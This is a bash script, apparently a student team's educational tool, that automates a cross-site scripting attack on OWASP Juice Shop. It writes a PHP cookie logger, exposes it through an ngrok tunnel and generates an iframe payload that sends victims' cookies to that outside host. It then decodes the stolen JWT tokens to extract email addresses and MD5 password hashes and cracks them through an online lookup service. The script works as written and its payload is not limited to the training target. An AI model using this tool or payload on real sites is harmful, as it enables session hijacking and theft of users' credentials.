#!/bin/bash

# For this script to work, you must first configure an authkey on your ngrok binary. For more information on this, go to https://ngrok.com/download
# Extract the binary in the same folder where this script is located.

echo -e "\e[34m                    \e[36m__\e[0m"
echo -e "\e[34m                   \e[36m/.-\e[0m"
echo -e "\e[34m           ______ \e[36m//\e[0m"
echo -e "\e[34m          /______\e[36m'/\e[34m|\e[0m"
echo -e "\e[34m          [       ]|\e[0m      [OWASP juice shop XSS information stealer framework]"
echo -e "\e[34m          [ \e[0mSmurf\e[34m ]|\e[0m                      [Team Smurfs HvA, 2020]"
echo -e "\e[34m          [ \e[0mJuice\e[34m ]|\e[0m        This script was written for educational purposes"
echo -e "\e[34m          [\e[31m  _\_  \e[34m]|\e[0m"
echo -e "\e[34m          [\e[31m  :::  \e[34m]|\e[0m"
echo -e "\e[34m          [\e[31m   :'  \e[34m]/\e[0m"
echo -e "\e[34m          '-------'\e[0m"

echo -e ""
read -p "[?] Enter XSS vulnerable URL (ending with ?q=) > " vuln_url
read -p "[?] Enter server port for webapplication > " srv_port

echo -e "\e[34m[!]\e[0m Creating logfile..."
cat /dev/null > ./log.txt

echo -e "\e[34m[!]\e[0m Writing PHP cookiestealer..."
echo "<?php \$cookies=\$_GET[\"cookie\"];\$file=fopen('log.txt','a');fwrite(\$file,\$cookies.\"\\n\"); ?>" > cookiestealer.php

echo -e "\e[34m[!]\e[0m Generating URL..."
./ngrok http $srv_port > /dev/null &
sleep 3
WEBHOOK_URL=$(curl -s http://localhost:4040/api/tunnels | jq ".tunnels[0].public_url" |  tr -d '"' )
url="$vuln_url%3Ciframe%20frameborder%3D%220%22%20height%3D1px%20width%3D1px%20src%3D%22javascript:location.href%3D'$WEBHOOK_URL%2Fcookiestealer.php%3Fcookie%3D'%2Bdocument.cookie;%22%3E"
echo -e "\e[32m[+]\e[0m Generated URL: $url"
echo ""

php -S 127.0.0.1:$srv_port &

lines=$(wc -l < log.txt)
trap ctrl_c INT

function ctrl_c() {
	echo ""
	echo -e "\e[32m[+]\e[0m Cleaning up..."
	rm cookiestealer.php
	rm log.txt
	exit
}
while :
do
    if [ $lines -gt 0 ]
    then
        cookie=$(tail -n 1 log.txt)
	if [[ $cookie =~ "token=" ]]
	then
		email=$(echo "$cookie" | sed 's/^.*\(token=.*\).*$/\1/' | sed s/"token="/""/g | jwt-decode | jq ".data.email" | grep \"*\"|  tr -d '"')
        	echo -e "\e[32m[+]\e[0m Adress found: $email"
        	hash=$(echo "$cookie" | sed 's/^.*\(token=.*\).*$/\1/' | sed s/"token="/""/g | jwt-decode | jq ".data.password" | grep \"*\"| tr -d '"')
        	echo -e "\e[32m[+]\e[0m MD5-hash found: $hash"
        	pass=$(curl -s http://www.nitrxgen.net/md5db/$hash)
        	if [ -n "$pass" ]
		then
			echo -e "\e[32m[+]\e[0m Password found: $pass"
		else
			echo -e "\e[31m[-]\e[0m No password was found"
		fi
        	echo ""
        	head -n -1 log.txt > temp.txt ; mv temp.txt log.txt
        	lines=$(wc -l < log.txt)
	else
		echo -e "\e[31m[-]\e[0m No token was found"
		echo ""
		head -n -1 log.txt > temp.txt ; mv temp.txt log.txt
                lines=$(wc -l < log.txt)
	fi
    else
        lines=$(wc -l < log.txt)
    fi
done
